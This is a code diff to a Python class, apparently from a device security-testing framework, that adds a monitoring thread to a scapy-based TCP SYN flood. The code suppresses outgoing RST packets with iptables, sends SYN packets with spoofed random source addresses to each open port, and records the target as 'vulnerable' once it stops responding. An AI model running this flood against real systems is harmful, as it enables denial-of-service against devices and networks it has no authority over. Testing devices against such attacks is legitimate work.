@@ -3,7 +3,7 @@ import logging
 log = logging.getLogger(__name__)
 from scapy.all import *
 import os
-
+import threading
 
 class TcpSyn(GenericAttack):
 
@@ -32,11 +32,17 @@ class TcpSyn(GenericAttack):
         command = "iptables -A OUTPUT -p tcp -s %s --tcp-flags RST RST  -j DROP" % target
         os.system(command)
 
+        tstatus = threading.Thread(target=self.deviceStatus, args=(result,))
+        tstatus.start()
+
         openPorts = self.device["vulnerable_ports"]["tcp"]["open"]
         counter = 0
         connectionsPerPort = dict((el, 0) for el in openPorts)
+        start_time = time.time()
         while self.running:
             for port in openPorts:
+                if not self.running:
+                    break
                 sport = random.randint(1024, 65535)
                 rand_addr = self.address_spoofer()
                 pkt = IP(src=rand_addr, dst=target)
@@ -44,12 +50,26 @@ class TcpSyn(GenericAttack):
                 send(pkt)
                 connectionsPerPort[port] = (connectionsPerPort[port] + 1)
                 counter = counter + 1
-            if not self.retry_is_alive():
-                log.info('Host not responding!')
-                result.update({"status": "vulnerable", "connections": counter,
-                               "connection_distribution": connectionsPerPort})
-                return
-        result.update({"status": "not vulnerable"})
+
+        tstatus.join()
+
+        result.update({"connections": counter,
+                       "connection_distribution": connectionsPerPort, "attack_time:" : (time.time() - start_time)})
+        return
+
+
+    def deviceStatus(self, result):
+        max = 5
+        detected = 0
+        while self.running:
+            if not self.is_alive():
+                detected = detected + 1
+                time.sleep(0.1)
+                if detected == max:
+                    result.update({"status": "vulnerable", "dos-status": "device not responding"})
+                    self.running = False
+                    return
+        result.update({"status": "not_vulnerable", "dos-status": "device responding"})
         return
 
     def shutdown(self):
